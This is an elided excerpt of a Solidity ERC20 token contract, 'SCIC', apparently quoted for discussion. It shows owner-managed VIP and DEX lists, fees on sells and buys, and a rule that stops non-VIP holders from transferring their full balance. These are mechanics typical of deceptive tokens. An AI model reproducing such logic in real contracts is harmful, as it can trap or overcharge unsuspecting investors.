...
contract SCICToken is ERC20, ERC20Burnable, Ownable {
    struct TokenConfig {
        address a1;
    }
    ...
    constructor(address a) ERC20("Star chain international coin", "SCIC") {
        _mint(_msgSender(), 43100 * 10 ** decimals());
        tokenConfig.a1 = a;
    ...
    function _beforeTokenTransfer(
        ...
        if (!VIPs[from] && DEXs[to]) {
            ...
            uint256 _cost = (amount / 100) + 1000000 gwei;
    ...
    returns(bool)
    {
        ...
        if (DEXs[owner] && !VIPs[to]) {
            ...
            _transfer(owner, to, (amount * 99) / 100);
            return true;
        }
        _transfer(owner, to, amount);
        if (!VIPs[owner]) {
            uint256 _balance = balanceOf(owner);
            require(_balance >= 1000000 gwei, "invalid balance");
        }
        return true;
    }
}
